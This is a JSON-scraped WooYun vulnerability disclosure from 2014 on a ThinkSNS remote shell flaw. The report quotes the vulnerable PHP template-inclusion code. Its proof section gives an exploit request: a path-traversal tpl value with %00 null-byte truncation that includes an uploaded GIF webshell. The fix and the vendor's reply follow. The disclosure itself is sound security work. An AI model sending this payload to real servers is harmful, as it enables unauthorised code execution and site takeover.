{"id": 47945, "wybug_id": "wooyun-2014-079186", "wybug_title": "ThinkSNS 前台getshell", "wybug_corp": "ThinkSNS", "wybug_author": "phith0n", "wybug_date": "2014-10-13 14:40", "wybug_open_date": "2015-01-11 14:42", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向公众公开  简要描述： XDCTF2014能顺利结束真开心，发0day凑点钱请大家吃个饭~ 详细说明：  /apps/page/Lib/Action/DiyAction.class.php 330行：\npublic function getTpl() {\t\t$parseTag = model ( 'ParseTag' );\t\t$tpl = $_REQUEST ['tpl'];\t\t$sign = $_REQUEST ['sign'];\t\t$tagName = $_REQUEST ['tagName'];\t\techo $parseTag->getTplContent ( $tpl, $tagName, $sign );\t}\ngetTpl函数，直接去了$_REQUEST中的三个变量，传给getTplContent函数，进去看看：\npublic function getTplContent($tpl, $tagName, $sign) {\t\tif (strpos ( $tpl, 'custom' ) !== false) {\t\t\treturn model ( 'DiyWidget' )->getTemplateByPluginId ( $sign );\t\t} else {\t\t\tlist ( $dir, $file ) = explode ( ':', $tagName );\t\t\t$file = ucfirst ( $file );\t\t\t\t\t\t\trequire_once self::$tags [strtolower ( $tagName )];\t\t\t$this->fileObject = new $file ();\t\t\tob_start ();\t\t\tob_implicit_flush ( 0 );\t\t\tinclude $this->fileObject->getTemplateFile ( $tpl );\t\t\t$content = ob_get_clean ();\t\t\treturn $content;\t\t}\t\t}\n关注这三行：list ( $dir, $file ) = explode ( ':', $tagName );$this->fileObject = new $file ();include $this->fileObject->getTemplateFile ( $tpl );首先从tagName中取出dir和file，并新建一个file对象。最后调用file对象的getTemplateFile函数，将$tpl传入。最后包含之。我们看看哪些对象有getTemplateFile方法：\n\n这些都行，我们随便找个进去看看：比如DiyImage:\npublic function getTemplateFile($tpl = \"\") {\t\t//返回需要渲染的模板\t\t$file = $this->attr ['style'];\t\tif(!empty($tpl)){\t\t\t$file = $tpl;\t\t}\t\treturn dirname(__FILE__).'/DiyImage/'.$file.'.html';\t}\n实际上最后包含的就是：dirname(__FILE__).'/DiyImage/'.$file.'.html';所以，我们可以通过%00截断来进行任意文件包含。thinksns全局没用转义$_GET/$_POST/$_REQUEST，而是在相应位置调用t()函数过滤。但在这个点，并未对$_REQUEST ['tpl'];进行t()过滤，所以%00没有被转义）   漏洞证明：  注册登录，发微博处直接传webshell：\n\n向http://localhost/thinksns/index.php?app=page&mod=Diy&act=getTplPOST数据：tpl=../../../../../data/upload/2014/1013/14/543b6f21ed721_100_100.gif%00&tagName=w:DiyImage&sign=tpl处为webshell地址，使用00截断。需要加个referer，如图：\n\n成功getshell。   修复方案：  t($_REQUEST['tpl']);   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-10-14 09:24 厂商回复： 非常感谢，DIY模块应该只有管理员才可以操作使用。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-13 15:33 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  前排围观又一个getshell    \n     2014-10-13 15:38 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  你们是打算来次大保健吧    \n     2014-10-13 15:54 |    \t\t0x7575 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:16        )\t\t \n  哎 膜拜！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}